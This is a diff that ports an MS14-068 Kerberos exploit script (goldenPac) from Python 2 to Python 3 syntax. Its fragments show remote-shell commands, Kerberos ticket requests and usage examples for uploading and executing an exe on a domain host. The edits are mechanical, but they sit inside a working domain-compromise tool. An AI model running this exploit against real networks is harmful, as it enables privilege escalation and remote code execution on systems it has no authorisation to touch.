@@ -29,6 +29,7 @@
 #       to the hosts file or use the -dc-ip and -target-ip parameters
 #
 
+from __future__ import print_function
 import cmd
 import logging
 import os
@@ -97,7 +98,7 @@ class PSEXEC:
         dce = rpctransport.get_dce_rpc()
         try:
             dce.connect()
-        except Exception, e:
+        except Exception as e:
             logging.critical(str(e))
             sys.exit(1)
 
@@ -115,7 +116,7 @@ class PSEXEC:
             else:
                 try:
                     f = open(self.__exeFile)
-                except Exception, e:
+                except Exception as e:
                     logging.critical(str(e))
                     sys.exit(1)
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
@@ -308,13 +309,13 @@ class RemoteShell(cmd.Cmd):
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
     def do_help(self, line):
-        print """
+        print("""
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
  put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
  get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
  ! {cmd}                    - executes a local shell cmd
-""" % (self.share, self.share)
+""" % (self.share, self.share))
         self.send_data('\r\n', False)
 
     def do_shell(self, s):
@@ -332,7 +333,7 @@ class RemoteShell(cmd.Cmd):
             logging.info("Downloading %s\%s" % (self.share, src_path))
             self.transferClient.getFile(self.share, src_path, fh.write)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -357,7 +358,7 @@ class RemoteShell(cmd.Cmd):
             logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
             self.transferClient.putFile(self.share, pathname, fh.read)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -366,11 +367,11 @@ class RemoteShell(cmd.Cmd):
 
     def do_lcd(self, s):
         if s == '':
-            print os.getcwd()
+            print(os.getcwd())
         else:
             try:
                 os.chdir(s)
-            except Exception, e:
+            except Exception as e:
                 logging.error(str(e))
         self.send_data('\r\n')
 
@@ -894,7 +895,7 @@ class MS14_068:
         self.__domainSid, self.__rid = self.getUserSID()
         try:
             self.__forestSid = self.getForestSid()
-        except Exception, e:
+        except Exception as e:
             # For some reason we couldn't get the forest data. No problem, we can still continue
             # Only drawback is we won't get forest admin if successful
             logging.error('Couldn\'t get forest info (%s), continuing' % str(e))
@@ -916,7 +917,7 @@ class MS14_068:
                     tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                             self.__lmhash, self.__nthash, None,
                                                                             self.__kdcHost, requestPAC=False)
-                except KerberosError, e:
+                except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -971,7 +972,7 @@ class MS14_068:
                     tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain,
                                                                                         self.__kdcHost, tgs, cipher,
                                                                                         sessionKey)
-                except KerberosError, e:
+                except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -1053,7 +1054,7 @@ if __name__ == '__main__':
     from pyasn1.codec.der import decoder, encoder
     from Crypto.Hash import MD5
 
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True,
                                      description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
@@ -1080,15 +1081,15 @@ if __name__ == '__main__':
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nExamples: "
-        print "\tpython goldenPac domain.net/normaluser@domain-host\n"
-        print "\tthe password will be asked, or\n"
-        print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
-        print "\tif domain.net and/or domain-machine do not resolve, add them"
-        print "\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
-        print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
-        print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
-        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
+        print("\nExamples: ")
+        print("\tpython goldenPac domain.net/normaluser@domain-host\n")
+        print("\tthe password will be asked, or\n")
+        print("\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n")
+        print("\tif domain.net and/or domain-machine do not resolve, add them")
+        print("\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n")
+        print("\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n")
+        print("\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn")
+        print("\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n")
         sys.exit(1)
  
     options = parser.parse_args()
@@ -1125,7 +1126,7 @@ if __name__ == '__main__':
 
     try:
         dumper.exploit()
-    except Exception, e:
+    except Exception as e:
         #import traceback
         #print traceback.print_exc()
         logging.critical(str(e))
